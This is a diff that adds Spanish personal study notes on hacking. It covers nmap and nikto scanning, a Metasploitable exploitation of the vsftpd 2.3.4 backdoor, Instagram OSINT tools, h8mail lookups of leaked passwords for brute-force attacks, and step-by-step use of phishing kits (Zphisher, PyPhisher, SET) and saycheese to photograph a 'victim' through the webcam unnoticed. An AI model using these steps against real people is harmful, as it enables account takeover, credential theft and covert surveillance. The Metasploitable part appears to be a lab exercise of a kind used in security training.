@@ -33,7 +33,7 @@ Muestra los puertos abiertos o posiblemente abiertos
 
 también puedo hacer un nano y escribir en el direcciones ip o dominios  y luego escanearlos a través del nombre del archivo como nmap -Il Dominio web
 
-las Scan techniqus que aparecen allí sirven en caso de que se vea algún rechazi por parte del firewall
+las Scan technicas que aparecen allí sirven en caso de que se vea algún rechazo por parte del firewall
 
 searchsploit vsftpd num_version
 ayuda a buscar sploit dentro de la versión 
@@ -47,3 +47,302 @@ para el escaneo especifico con scripts seria el siguiente comando:
 nmap --scripts="nombre_del_script(direccion)" ip o dominio web 
 este devuelve el protocolo completo mas información sobre directorios entre mas funciones
 
+OSINT
+existen variedad de formas para hacer OSINT entre ellas están los bots como instabot que esta en repos de GitHub 
+
+solo es cuestión de copiar el siguiente comando en la consola Phyton
+Bot de instagram para hacer osint,y muchas funcionalidades
+
+Instalacion:
+
+Para instalarlos lo puedes hacer creando otra carpeta nueva
+Mkdir Carpetanueva
+abres la carpeta nueva
+cd Carpetanueva
+
+git clone https://github.com/thiagous06/InstaBot.git
+
+git clone https://github.com/thiagous06/InstaBot.git
+
+NO USAR MUY SEGUIDO 
+(también se puede con:
+Link repositorio
+https://github.com/ahmadchen/osi.ig
+Link para copiar la herramienta
+$ git clone https://github.com/ahmadchen/osi.ig.git && cd osi.ig)
+
+Este otro repositorio a copiar para usar herramienra
+https://github.com/th3unkn0n/osi.ig
+
+este es el comando para copiar e instalar en la maquina la herramienta
+git clone https://github.com/th3unkn0n/osi.ig.git && cd osi.ig
+
+luego entra a este repositorio
+https://github.com/Datalux/Osintgram
+luego escribe en la consola 
+git clone https://github.com/Datalux/Osintgram.git
+
+
+OSINTGRAM
+
+editar la herramienta 
+para eso lo principal es tener un editor de texto
+primero haz un update a los paquetes 
+sudo apt-get update
+luego instala el editor
+sudo apt-get install leafpad
+luego entra a la carpeta abre el Osintgram
+cd Osintgram
+cd config
+luego escriba 
+leafpad settings.json 
+y escriba {}
+y luego escriba 
+leafpad credentials.ini
+allí escriba su nmbre de usuario y contraseña de Linux
+haz un cat settings.json
+y un cat credentials.ini 
+para confirmar que si están escritos
+
+para investigar a un usuario Instagram escribe
+Python main.py Nombre de usuario
+pones list para listar las opciones de la herramienta para usar en el Instagram
+
+Comandos ejemplo
+likes
+para saber cuantos likes tiene
+info 
+para saber información general incluyendo link de foto de perfil
+hashtags para ver los hashtags que uso la cuenta
+tagged o wtagged
+para ver los usuarios etiquetados por el usuario atacado
+stories
+para descargar las historias de este
+generalmente estarán en la carpeta output
+wcommented
+para saber quienes comentaron en el perfil del usuario
+incluyendo id y nombre de usuario y nombre completo registrado
+propic
+para descargar la foto de perfil
+photos 
+para descargar todas las fotos que tenga en su cuenta de Instagram
+followers 
+para ver todos los usuarios que siguen a la cuenta
+comments 
+para ver el total de los comentarios en las  publicaciones 
+addrs
+para saber las ubicaciones de donde el usuario subio las fotos
+photodes
+para ver la descripción de cada foto
+
+Todo esto se puede hacer para realizar un ataque a las cuentas recopila información para hacer ataques
+
+herramienta YPHISH
+Link de repositorio de herramienta
+https://github.com/thiagoaraujosec/YPhish
+Link de descarga 
+https://github.com/thiagoaraujosec/YPhish.git
+El link de descarga se debe copiar en  la consola de Linux
+menú de comandos
+phising 
+sirve para hacer phising a redes sociales incluyendo LinkedIn
+
+Geolocalización
+Sirve para paginas web y servidores los rastrea:
+whois
+Da la ip del servidor o pagina web se puede consultar por buscador
+cualesmiip
+Rastrea las ips dadas al sitio exacto
+
+Perfiles de personas en internet
+herramienta userecon
+
+repositorio a copiar para uso de herramienta (copiar en Consola)
+Link del repositorio
+https://github.com/wishihab/userrecon
+git clone  https://github.com/wishihab/userrecon.git
+Esta herramienta sirve para encontrar todos las redes sociales creadas por el usuario dado
+arroja los link de cada pagina red social
+
+Comprobar si un email existe
+pagina online: email checker
+arroja si este email existe o no muestra OK si existe o Bad si no existe
+
+OSINT FRAMEWORK
+pagina online: osint framework
+arroja las herramientas actualizadas dde link a repositorios 
+Sirve para sacar información de victimas 
+
+Namecheckup
+encuentras nombres de usuario en la internet  
+sirve para saber si un nombre de usuario esta ocupado o no acorde a cada extension
+
+sacar contraseñas filtradas de un email
+hay que usar la herramienta h8mail
+sudo pip instal h8mail
+Esta herramienta funciona a través de explorar bases de datos para encontrar contraseñas filtradas
+averiguar el correo del cliente 
+luego usar el siguiente comando
+h8mail -t correo_electronico
+debe mostrar las credenciales expuestas en el internet incluyendo usuarios y contraseñas
+además lanza hash que se deben desencriptar
+Jhon the Ripper sirve para desencriptar
+Podemos usar las contraseñas para hacer ataques de fuerza bruta teniéndolo asi como una biblioteca
+
+ANALISIS DE VULNERABILIDADES
+
+Herramienta Nmap Escanear vulnerabilidades
+para escanear un host
+nmap --script=vuln IPHOST
+Arroja datos y referencias de sitios y vulnerabilidades de la maquina
+
+Herramienta nikto
+pones en la terminal nikto
+comandos ejemplo
+nikto -host IP o pagina web
+arroja un Ip objetivo que si lo ponemos en el buscador	vemos la pagina vulnerable también arroja el puerto y la maquina en la que esta el servidor también da la opción de hacer un escaneo
+profundo para el sistema si añadimos /robox.txt a la pagina web nos arrojara un directorio
+
+Herramienta Owas zap
+Ayuda a encontrar vulnerabilidades de las pagina web pero al parecer ya no existe
+es recomendable hacer los escaneos en Modo seguro para hacerlos sigilosamente
+
+Fase de explotación
+La idea es comprometer sistemas tomando control de ellos y explotamos sus vulnerabilidades
+
+FASE #1
+Hackear metasploitable
+información
+Ip:numIp
+todos los puertos del metasploitable son tcp y todos los puertos están abiertos
+ataque:
+comandos:
+sudo netdiscover
+Sirve para escanear la red y ver los dispositivos conectados
+uno vez identificado el dispositivo objetivo
+nmap -sV numIp
+para escanear la ip ver los puertos abiertos y sus versiones
+vemos el servicio ftp que en este caaso es el que atacaremos
+21/tcp   open  ftp         vsftpd 2.3.4
+luego usamos el comando para observar las vulnerabilidades del versionamiento del servicio y asi hacer un posible ataque
+$ searchsploit vsftp 2.3.4
+también podemos escribir nmap -script=vuln ip
+para seguir buscando vulnerabilidades
+abrimos otra terminal y escibimos
+msfconsole 
+para abrir la consola msf
+una vez mas buscamos vsftpd dentro del msf
+usamos el comando
+search vsftpd
+hacemos un 
+use exploit exploit/unix/ftp/vsftpd_234_backdoor
+esto refiere
+use exploit +direccion_pauqte
+para aprovecharlo
+hacemos show options para ver las opciones dadas
+observamos los nombres de las opciones y hacemos un
+set RHOSTS Ip
+es decir:
+set Nombre_opción IP
+una vez arreglamos a la opción hacemos el comando 
+show options para ver si la función dada si esta allí junto con su IP
+en la opción debería aparecer
+RHOSTS IP
+si confirmamos que la ip esta allí entonces hacemosss el comando
+run
+para correr el exploit
+esto nos mostrara
+banner 
+user 
+backdoor 
+UID
+Shell
+detecta las sesiones iniciadas allí
+luego
+ingresa al Shell 
+para comprobar que estamos allí debemos escribir el comando:
+pwd
+nos mostrara
+/
+luego accedemos a las carpetas del metasploitable
+hacemos el comando:
+ls
+para listar los paquetes
+Phising
+Engaño a una persona con el fin de obtener información
+Preferiblemente causando emociones en la victima que generen ansiedad 
+La técnica mas común es la de:
+hacerse pasar por una entidad como Facebook o Google y decir que alguien ha iniciado sesión da click aquí para ver
+una medida de precaución es usar virustotal en caso de archivos generalmente para evitar que otros tomen el control de tu equipo
+
+Herramienta PyPhisher
+Link del repositorio GitHub
+https://github.com/KasRoudra2/PyPhisher
+link de la herramienta (copiar en consola)
+git clone https://github.com/KasRoudra/PyPhisher
+para esto necesito copiar las siguiente dependencia en consola
+sudo apt install git python3 php openssh-client -y
+abrimos el paquete de PyPhisher
+cd PyPhisher
+instalo los requerimientos de la herramienta
+pip3 install -r files/requirements.txt
+ejecuto la herramienta
+python3 pyphisher.py
+esta herramienta da opciones de aplicaciones a las cuales hacerle Phising luego teniendo en cuenta los protocolos de seguridad de las mismas da opciones al usario para evadir dichas opciones o no
+supuestamente el mejor link es el que se arroja del LocalHostRun
+mostrara un espacio de la pagina que escogimos si alguien ingresa datos ahí el servidor nos mostrara los datos generalmente serán usuario y contraseña
+Esta herramienta no funciona ya
+
+Herramienta Zphisher 
+link del repositorio
+https://github.com/Exido-Rio/zphisher-
+link de la herramienta a copiar
+git clone https://github.com/Exido-Rio/zphisher-.git
+luego abrimos la herramienta
+y hacemos el comando 
+bash zphisher.py
+en opciones si escogemos Instagram 
+luego escogemos la opción 1 o Tradicional
+nos dará tres opciones la opción que mas se adapta es la cloudfared
+luego diremos que no custom port
+dejamos que carguen los servicios
+luego daremos que no cambie la mascara URL
+entonces nos arrojara el link del cual usuario Victima ingresara usuario y contraseña esto nos permitirá ingresar 
+
+Herramienta SETLOOKIT
+usammos el comando 
+sudo setoolkit
+Terminos y Condiciones
+Los términos y condiciones de la herramienta SETOOLKIT:
+1. Se permite usar el código y distribuirlo siempre y cuando se de la correcta comisión a lo Autores 
+2.Tambien acalara que no se debe entrar o penetrar sistemas sin la correcta autorización de ser asi estas fallando a uno de ,los términos del sistema 
+nos dará diferentes opciones para hackear esta herramienta se suele usar para pruebas de penetracion
+entre ellas podemos clonar links de paginas web para robar información
+
+Herramienta Saycheese
+Sirve para obtener información de un equipo victima incluyendo dirección IP y toma fotos sin que la persona tenga el control del mismo ni se entere
+para esto los siguiente:
+link del repositorio
+https://github.com/hangetzzu/saycheese
+Link de la herramienta a pegar en la consola
+git clone https://github.com/hangetzzu/saycheese.git
+una vez la instalamos 
+entramos a la carpeta 
+cd saycheese
+luego hacemos
+bash saycheese.sh
+escojo  la opción 1
+doy el link a la victimaa
+luego el empieza a tomar fotos de la cámara sin que el usuario se entere
+es solo que el usuario debe autorizar la entrada a la cámara
+luego de ello para terminar de ejecutar el script se debe dar click a las teclas
+ctrl c
+Las fotos quedaran registradas en el directorio saycheese
+
+Herramientas lockphish
+link del repositorio
+https://github.com/JasonJerry/lockphish.git
+link de la herramienta
+git clone https://github.com/JasonJerry/lockphish.git
+una vez instalada abrimos la carpeta 
+cd Lockphish 
